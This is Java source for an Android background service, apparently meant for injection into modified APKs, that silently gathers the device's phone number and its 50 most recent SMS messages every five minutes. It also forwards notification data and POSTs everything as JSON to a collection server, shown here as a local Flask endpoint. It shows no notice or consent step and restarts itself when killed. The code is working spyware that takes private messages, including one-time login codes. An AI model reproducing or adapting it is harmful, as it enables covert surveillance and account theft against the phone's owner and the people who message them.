package com.apkmodifier;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Lite Service - Only collects phone number and SMS messages
 * Simplified version for minimal data collection
 */
public class DataCollectionService extends Service {
    private static final String TAG = "DataCollectionLite";
    private Handler handler;
    private static final long COLLECTION_INTERVAL = 300000; // 5 minutes
    
    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startDataCollection();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            switch (intent.getAction()) {
                case "NOTIFICATION_DATA":
                    String notificationData = intent.getStringExtra("data");
                    sendToServer("notification", notificationData);
                    break;
                case "COLLECT_ALL":
                    collectAllData();
                    break;
            }
        }
        return START_STICKY;
    }
    
    private void startDataCollection() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                collectAllData();
                handler.postDelayed(this, COLLECTION_INTERVAL);
            }
        }, 0);
    }
    
    private void collectAllData() {
        new Thread(() -> {
            try {
                JSONObject allData = new JSONObject();
                allData.put("timestamp", System.currentTimeMillis());
                allData.put("phone_number", getPhoneNumber());
                allData.put("sms", getSMS());
                
                sendToServer("device_data", allData.toString());
                Log.d(TAG, "Phone number and SMS collected and sent");
            } catch (Exception e) {
                Log.e(TAG, "Error collecting data", e);
            }
        }).start();
    }
    
    private String getPhoneNumber() {
        String phoneNumber = "Unknown";
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                try {
                    String number = tm.getLine1Number();
                    if (number != null && !number.isEmpty()) {
                        phoneNumber = number;
                    }
                } catch (SecurityException e) {
                    phoneNumber = "Permission denied";
                    Log.e(TAG, "Phone permission denied", e);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone number", e);
        }
        return phoneNumber;
    }

    
    private JSONArray getSMS() {
        JSONArray smsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                    
                    sms.put("address", address);
                    sms.put("body", body);
                    sms.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(date)));
                    sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "received" : "sent");
                    smsArray.put(sms);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "SMS permission denied", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS", e);
        }
        return smsArray;
    }

    
    private void sendToServer(String type, String data) {
        new Thread(() -> {
            try {
                // Send to local Flask server
                URL url = new URL("http://127.0.0.1:5000/api/device_data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("type", type);
                payload.put("data", new JSONObject(data));
                payload.put("timestamp", System.currentTimeMillis());
                payload.put("device_id", android.os.Build.MODEL + "_" + android.os.Build.DEVICE);
                
                OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                writer.write(payload.toString());
                writer.flush();
                writer.close();
                
                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Data sent, response: " + responseCode);
                
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending data to server", e);
            }
        }).start();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
